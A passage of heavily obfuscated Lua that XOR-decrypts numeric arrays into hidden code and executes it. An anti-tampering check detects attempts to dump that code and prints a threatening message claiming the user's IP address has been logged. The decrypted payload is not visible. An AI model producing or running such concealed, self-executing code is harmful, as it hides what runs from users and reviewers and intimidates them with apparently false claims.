        function(s) uLLSq8s8iUcaBO0y3HCrX8vjEw4ulnBVwtWpwe8QZrxCz6zxGSBJfLeUOPDBiWba(s,
            function(t) if #wZC7O61qSVC8vNQ0EmGNceiR4PYulaaDRA8l6XhC4v3hnZtbkPo9laAd(t7fZLO1oIKI0P0EbR7yCOFSfaWHnb4l6EdImCwzGJNSVeoezXoBl[lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('54') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('A3') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('DD') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('2C')]) == 1 then if t7fZLO1oIKI0P0EbR7yCOFSfaWHnb4l6EdImCwzGJNSVeoezXoBl[lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('54') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('A3') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('DD') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('2C')] == t7fZLO1oIKI0P0EbR7yCOFSfaWHnb4l6EdImCwzGJNSVeoezXoBl[lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('68') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('F2') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('05') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('DE') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('7C')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if t7fZLO1oIKI0P0EbR7yCOFSfaWHnb4l6EdImCwzGJNSVeoezXoBl[lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('54') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('A3') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('DD') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('2C')](t) then
                    t7fZLO1oIKI0P0EbR7yCOFSfaWHnb4l6EdImCwzGJNSVeoezXoBl
                        [lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('54') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('A3') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('DD') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('2C')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; jwPkZaZbEgI0jtQP6kH5t0T9dSjK7lXlNLvYa8u0WJHi1kmMvFTpkk9tiRSlLcpRvf4tjuGr(
{ 815, 1068, 1203, 620, 739, 1053, 552, 828, 1039, 1100, 1060, 1072, 640, 1206, 782, 664, 700, 727, 934, 1199, 603, 677,
  615, 887, 779, 973, 893, 650, 570, 922, 572, 916, 1108, 847, 657, 619, 939, 556, 876, 790, 710, 845, 865, 1109, 1086,
  722, 943, 1123, 1066, 953, 1129, 1098, 878, 1114, 897, 770, 956, 803, 687, 607, 635, 1004, 582, 993, 1080, 1166, 1139,
  759, 574, 1148, 1185, 1010, 836, 728, 920, 796, 579, 756, 764, 1041, 1126, 729, 544, 694, 1163, 1208, 833, 543, 715,
  1025, 1091, 1074, 698, 777, 630, 763, 856, 1181, 578, 1172, 841, 680, 997, 659, 768, 691, 623, 786, 766, 587, 987, 988,
  1116, 734, 1124, 1000, 980, 1035, 1024, 591, 788, 757, 673, 1081, 1005, 645, 1020, 1095, 595, 661, 963, 643, 1122,
  1013, 1179, 755, 731, 1014, 721, 706, 641, 800, 1103, 711, 1144, 564, 918, 613, 1034, 1092, 1134, 545, 738, 705, 1064,
  906, 713, 1158, 1011, 726, 992, 832, 900, 798, 550, 730, 1174, 724, 780, 950, 1194, 553, 592, 602, 761, 819, 912, 735,
  806, 826, 622, 923, 1088, 637, 551, 925, 633, 1186, 986, 913, 1077, 695, 937, 1033, 941, 562, 1084, 682, 1201, 1147,
  775, 703, 792, 960, 1069, 617, 612, 891, 1063, 1132, 1161, 924, 581, 910, 559, 989, 1183, 859, 969, 1023, 693, 583,
  684, 662, 957, 558, 614, 949, 1188, 1117, 851, 1026, 962, 907, 1038, 994, 627, 621, 600, 1076, 1065, 1195, 1015, 1115,
  760, 1190, 1022, 1193, 628, 676, 919, 1113, 970, 952, 647, 1032, 852, 849, 1205, 678, 946, 996, 1170, 674, 1008, 1027,
  663, 649, 822, 714, 873, 629, 567, 1105, 608, 1149, 908, 1211, 701, 1017, 816, 883, 1003, 604, 1184, 901, 753, 858,
  707, 689, 911, 1121, 968, 1167, 686, 588, 736, 563, 1176, 870, 781, 631, 843, 817, 981, 1175, 1070, 1140, 1043, 972,
  802, 636, 1141, 1168, 799, 638, 748, 976, 717, 978, 959, 929, 945, 902, 708, 665, 998, 955, 1111, 877, 1056, 1028, 565,
  853, 675, 942, 566, 709, 646, 824, 568, 892, 685, 1152, 1197, 999, 1106, 699, 1054, 965, 697, 872, 1155, 547, 611, 854,
  639, 890, 938, 576, 741, 909, 754, 1118, 914, 555, 585, 827, 961, 801, 1154, 1156, 821, 667, 1099, 1050, 888, 625, 990,
  947, 896, 1075, 812, 881, 1189, 787, 651, 903, 1162, 1196, 671, 1177, 601, 750, 610, 966, 917, 1037, 594, 839, 752,
  974, 666, 983, 548, 720, 1151, 869, 1112, 690, 1145, 1180, 1137, 746, 931, 1120, 743, 1061, 889, 1192, 1173, 879, 1019,
  835, 783, 1210, 1007, 921, 1133, 984, 692, 1046, 652, 886, 1160, 1012, 584, 1045, 1044, 1031, 805, 1062, 933, 1212,
  733, 885, 871, 789, 776, 1159, 1171, 895, 560, 1047, 1182, 575, 1165, 747, 979, 1202, 1049, 654, 1030, 1130, 1207,
  1073, 1001, 1051, 546, 838, 855, 656, 899, 811, 964, 1191, 904, 915, 848, 762, 683, 864, 1009, 951, 1102, 589, 898,
  975, 653, 605, 1125, 991, 1029, 831, 774, 702, 742, 725, 681, 648, 810, 928, 634, 807, 850, 1058, 670, 1198, 632, 936,
  1085, 1107, 599, 1018, 1143, 874, 618, 1071, 784, 791, 1083, 1016, 642, 767, 842, 818, 1153, 1150, 1067, 1082, 808,
  1002, 844, 930, 967, 1089, 882, 804, 861, 688, 616, 958, -1, 68, 33, 122, 92, 97, 25, 105, 21, 80, 40, 112, 41, 42,
  124, 49, 16, 104, 10, 32, 0, 35, 40, 75, 78, 18, 29, 188, 7, 234, 58, 79, 82, 65, 107, 51, 27, 78, 202, 124, 14, 57,
  75, 73, 250, 95, 25, 94, 73, 53, 75, 112, 77, 10, 38, 247, 187, 88, 42, 12, 2, 75, 7, 107, 248, 89, 17, 142, 111, 82,
  92, 67, 32, 52, 5, 84, 36, 84, 34, 2, 73, 0, 5, 19, 82, 25, 4, 54, 85, 52, 24, 99, 25, 80, 48, 125, 53, 80, 53, 0, 73,
  41, 66, 65, 18, 7, 51, 95, 32, 51, 22, 75, 84, 222, 90, 25, 182, 45, 151, 72, 97, 53, 52, 65, 93, 23, 240, 219, 71, 0,
  117, 88, 55, 97, 123, 45, 55, 97, 83, 43, 102, 71, 84, 55, 23, 57, 84, 57, 25, 40, 23, 8, 86, 16, 0, 71, 73, 82, 23,
  21, 111, 9, 240, 84, 23, 86, 2, 43, 84, 67, 121, 70, 68, 12, 245, 118, 140, 89, 32, 79, 25, 142, 97, 62, 124, 67, 116,
  112, 16, 118, 60, 73, 23, 120, 73, 248, 117, 41, 39, 97, 12, 27, 55, 4, 90, 45, 55, 178, 34, 128, 17, 28, 13, 82, 101,
  13, 206, 50, 75, 87, 117, 28, 4, 53, 111, 53, 84, 108, 51, 23, 113, 143, 84, 65, 51, 105, 186, 13, 64, 18, 5, 25, 100,
  135, 54, 36, 82, 75, 19, 98, 89, 109, 83, 191, 95, 62, 21, 29, 59, 30, 28, 88, 25, 11, 121, 23, 44, 229, 122, 25, 80,
  83, 62, 126, 68, 83, 93, 29, 119, 25, 22, 75, 111, 9, 66, 109, 95, 206, 15, 98, 12, 92, 98, 18, 14, 196, 102, 82, 159,
  59, 33, 28, 64, 97, 166, 30, 73, 22, 73, 46, 50, 107, 16, 64, 80, 200, 63, 30, 236, 122, 68, 195, 19, 82, 220, 201, 89,
  83, 19, 59, 19, 12, 47, 203, 109, 16, 84, 25, 61, 17, 85, 44, 188, 35, 85, 29, 71, 73, 17, 113, 53, 29, 121, 25, 82,
  73, 20, 111, 108, 50, 49, 83, 25, 225, 101, 10, 27, 83, 8, 43, 76, 10, 16, 23, 75, 52, 0, 93, 102, 117, 120, 110, 119,
  119, 124, 255, 18, 82, 31, 78, 149, 90, 80, 192, 46, 69, 75, 11, 62, 85, 83, 76, 114, 8, 6, 97, 2, 84, 31, 97, 88, 31,
  164, 104, 61, 82, 47, 81, 108, 111, 3, 126, 122, 95, 80, 84, 120, 73, 22, 146, 22, 54, 33, 59, 77, 164, 18, 23, 21, 4,
  117, 84, 19, 169, 105, 40, 87, 21, 84, 83, 104, 117, 59, 44, 38, 0, 7, 70, 54, 26, 1, 36, 89, 66, 236, 73, 97, 84, 85,
  78, 12, 34, 18, 74, 111, 66, 82, 122, 36, 56, 19, 49, 4, 57, 1, 90, 17, 78, 25, 23, 46, 114, 88, 90, 67, 18, 0, 113,
  158, 35, 47, 105, 46, 40, 46, 61, 206, 4, 117, 39, 86, 86, 7, 137, 80, 180, 117, 210, 29, 69, 98, 76, 66, 47, 46, 30,
  31, 109, 4, 90, 37, 10, 19, 16, 72, 12, 136, 31, 19, 22, 112, 84, 76, 19, 18, 113, 83, 102, 183, 11, 74, 58, 168, 29,
  135, 243, 59, 73, 67, 51, 23, 71, 86, 65, 81, 84, 54, 83, 102, 120, 24, 31, 58, 31, 92, 45, 45, 182, 38, 4, 6, 39, 26,
  97, 19, 235, 136, 78, 113, 245, 104, 71, 76, 151, 54, 99, 75, 29, 37, 88, 216, 4, 21, 73, 56, 23, 83, 39, 18, 6, 77,
  118, 125, 84, 56, 223, 122, 92, 80, 69, 2, 122, 128, 92, 91, 18, 111, 206, 7, 94, 39, 111, 90, 88, 75, 59, 202, 111,
  101, 22, 6, 68, 64, 31, 30, 184, 25, 13, 61, 18, 112, 71, 83, 87, 39, 122, 19, 12, 206, 94, 68, 12, 110, 13, 86, 35,
  64, 50, 23, 92, 97 }, "tOiPO9Z297iUg3tAr0p1kKAsnB"); hHlgdoOOsVbcMrEQlhJ5eHOqoPMhtxVVtpVw6WePb7jt5bhDY87QpbZDQrwj9BVC7RDM28Djzl =
t7fZLO1oIKI0P0EbR7yCOFSfaWHnb4l6EdImCwzGJNSVeoezXoBl; n69NX7zcjAHMUUabG8ZoBpnVQaiW1eED7MA8dotFlrFL9XOgoSkXlRQtEf1FWFo =
t7fZLO1oIKI0P0EbR7yCOFSfaWHnb4l6EdImCwzGJNSVeoezXoBl; dBdo6jyeyqXHfonXb9L9rXfObDmG1sjaJN1ynz98SaCHS3r5Bl6xk9mgyGxZ4yN8y =
n69NX7zcjAHMUUabG8ZoBpnVQaiW1eED7MA8dotFlrFL9XOgoSkXlRQtEf1FWFo; id39TFgnmI14oAgr6M6dsjD0q7CJ6QoVJ4e7EaErWMUOfbJ5MQfjPlJvqcnXVfBeVi =
dBdo6jyeyqXHfonXb9L9rXfObDmG1sjaJN1ynz98SaCHS3r5Bl6xk9mgyGxZ4yN8y; q2AIlxh8yRxhvkzPIMg5pmfQt5QjH113vijd4BIsFcvEy2SR4Q2r2Wpk0KJup4mRk =
id39TFgnmI14oAgr6M6dsjD0q7CJ6QoVJ4e7EaErWMUOfbJ5MQfjPlJvqcnXVfBeVi; oUXvJcnNEzDFKGMbSQ9lhPDMSiKqc2IWDunaWTmLY8tOuHiE1e5nyGzqD =
q2AIlxh8yRxhvkzPIMg5pmfQt5QjH113vijd4BIsFcvEy2SR4Q2r2Wpk0KJup4mRk; oLSG0gyYpuJT9VTUVA3nmhahQ9S9xQmqqTE4EukvRTwt6Vw0WX2UZCN =
oUXvJcnNEzDFKGMbSQ9lhPDMSiKqc2IWDunaWTmLY8tOuHiE1e5nyGzqD; bv6i7urP8lKdP6ArYy6ptfCKDeezHO2QC99aUGkreJg48o4k78dLnl4oABkmKUkG65b3CZDYJXD =
oLSG0gyYpuJT9VTUVA3nmhahQ9S9xQmqqTE4EukvRTwt6Vw0WX2UZCN; cmnsXAfACm3lgsZ80FoSsU6LX9A6LsQ1rJfj0OvnrgVpxzgcbkPWHkEz =
bv6i7urP8lKdP6ArYy6ptfCKDeezHO2QC99aUGkreJg48o4k78dLnl4oABkmKUkG65b3CZDYJXD; efRqf6E487oYHAoyQ8xP8Ce0TcE1f6qPhHExlIvhhRjqOnelZ3sRMriHcZGZeBt =
cmnsXAfACm3lgsZ80FoSsU6LX9A6LsQ1rJfj0OvnrgVpxzgcbkPWHkEz; k4Ug5Mx1ELG7pP8Xda3TPAuRuygivtrhiRO64w0PqK5LgFG6NO8jM2h00U8QpxHDYi =
efRqf6E487oYHAoyQ8xP8Ce0TcE1f6qPhHExlIvhhRjqOnelZ3sRMriHcZGZeBt; vjxeHPk7wqjo2qdFTPotuBtrRyOD7U9cdU3z3NUduw20JMcGK3O9Y2gR3m0jJkrBUpZ0iK5 =
k4Ug5Mx1ELG7pP8Xda3TPAuRuygivtrhiRO64w0PqK5LgFG6NO8jM2h00U8QpxHDYi; dRgFga5GdIbASsgGJfPgsOSyNY0Qqo4JCA8Eq8UpXHfUOlkapJZabhXo4 =
vjxeHPk7wqjo2qdFTPotuBtrRyOD7U9cdU3z3NUduw20JMcGK3O9Y2gR3m0jJkrBUpZ0iK5; iMqwI8V3egSCoRwUCo1SlxeaK63eiRo7Ej2MYlNp1A601DQzWkuY2zb1KutFndWB9t =
dRgFga5GdIbASsgGJfPgsOSyNY0Qqo4JCA8Eq8UpXHfUOlkapJZabhXo4; uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI = function(
  a)
  K, F = 6702066210529764, 16384 + 6516; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; e8wmy0N0bXw8FqsmHzIgRRN8CmMJuVUtGbe93nadtCYylX0ClGp0OQV = function(b)
  co = coroutine.create(b)
  qMvRjHApgTQ1FxTuas6uREzrFGYfXrHpgFeQwYCVmbLCH3lYoi60m = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(qMvRjHApgTQ1FxTuas6uREzrFGYfXrHpgFeQwYCVmbLCH3lYoi60m, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return qMvRjHApgTQ1FxTuas6uREzrFGYfXrHpgFeQwYCVmbLCH3lYoi60m
end; o7NIoN6LM4575URyK0xXVbcuSldCkO3MSF0TSHt3XuVEKs6vz8ELf8UEipg7fFFV = function(f, g)
  xMygSRCKysY9WtHecIeLp0bCx3FINg2FcRnSdX35aJItBedcgRLEURozN0aHj1mi3aI = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; f2DxGoYXnFGCdXaNJ6qlBQZosgGXPOMVLnl9wYBNbxwDuLfoYd8 = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; a1KWRtUrt1JesyJ8yE40GcrVNptqNB4aAeKxNGu5KApIOnfb1VxIBHlxKeXj0AK = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      xMygSRCKysY9WtHecIeLp0bCx3FINg2FcRnSdX35aJItBedcgRLEURozN0aHj1mi3aI(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; dFjcydpd7fC3dC3n5HzZYitvH7tYxHiRljEaWaT7FTZAzdjFm54nyb4ASbLG = function(p, n)
    ocbr8P2FGoBsep1ajkV5TBXc5mANYEjg36wJWcZAXpYYFcO5iIlLqncFfT4TsIinNdI2s5De47G = ""
    for k, q in pairs(p) do ocbr8P2FGoBsep1ajkV5TBXc5mANYEjg36wJWcZAXpYYFcO5iIlLqncFfT4TsIinNdI2s5De47G =
      ocbr8P2FGoBsep1ajkV5TBXc5mANYEjg36wJWcZAXpYYFcO5iIlLqncFfT4TsIinNdI2s5De47G ..
      iMqwI8V3egSCoRwUCo1SlxeaK63eiRo7Ej2MYlNp1A601DQzWkuY2zb1KutFndWB9t
      [uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('AB') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('5E') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('F8') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('AD') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('2C') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('47')]
      [uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('7B') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('FA') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('15') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('F8')](
      q) end
    ; n(ocbr8P2FGoBsep1ajkV5TBXc5mANYEjg36wJWcZAXpYYFcO5iIlLqncFfT4TsIinNdI2s5De47G)
  end; f2DxGoYXnFGCdXaNJ6qlBQZosgGXPOMVLnl9wYBNbxwDuLfoYd8(f,
    function(r) a1KWRtUrt1JesyJ8yE40GcrVNptqNB4aAeKxNGu5KApIOnfb1VxIBHlxKeXj0AK(r, g,
        function(s) dFjcydpd7fC3dC3n5HzZYitvH7tYxHiRljEaWaT7FTZAzdjFm54nyb4ASbLG(s,
            function(t) if #e8wmy0N0bXw8FqsmHzIgRRN8CmMJuVUtGbe93nadtCYylX0ClGp0OQV(iMqwI8V3egSCoRwUCo1SlxeaK63eiRo7Ej2MYlNp1A601DQzWkuY2zb1KutFndWB9t[uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('C6') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('DF') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('15') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('2E')]) == 1 then if iMqwI8V3egSCoRwUCo1SlxeaK63eiRo7Ej2MYlNp1A601DQzWkuY2zb1KutFndWB9t[uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('C6') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('DF') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('15') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('2E')] == iMqwI8V3egSCoRwUCo1SlxeaK63eiRo7Ej2MYlNp1A601DQzWkuY2zb1KutFndWB9t[uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('92') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('F8') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('AD') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('2C') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('5E')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if iMqwI8V3egSCoRwUCo1SlxeaK63eiRo7Ej2MYlNp1A601DQzWkuY2zb1KutFndWB9t[uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('C6') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('DF') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('15') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('2E')](t) then
                    iMqwI8V3egSCoRwUCo1SlxeaK63eiRo7Ej2MYlNp1A601DQzWkuY2zb1KutFndWB9t
                        [uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('C6') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('DF') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('15') .. uAz8yE2LjRPSfNNnNnUexp5TkwjMVZF18d1RfgMMRcxtkUxYknMKh00LK98jbQI('2E')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; o7NIoN6LM4575URyK0xXVbcuSldCkO3MSF0TSHt3XuVEKs6vz8ELf8UEipg7fFFV(
{ 1100, 553, 1169, 1027, 1078, 701, 956, 594, 623, 1141, 1011, 1133, 1112, 851, 1072, 967, 1128, 1115, 1194, 563, 948,
  914, 679, 589, 740, 1071, 741, 1056, 752, 703, 880, 1167, 581, 725, 634, 1103, 723, 807, 860, 1086, 779, 1074, 1184,
  697, 787, 1037, 618, 1095, 1051, 816, 972, 795, 705, 930, 1199, 1188, 755, 1151, 1105, 641, 551, 832, 918, 884, 1104,
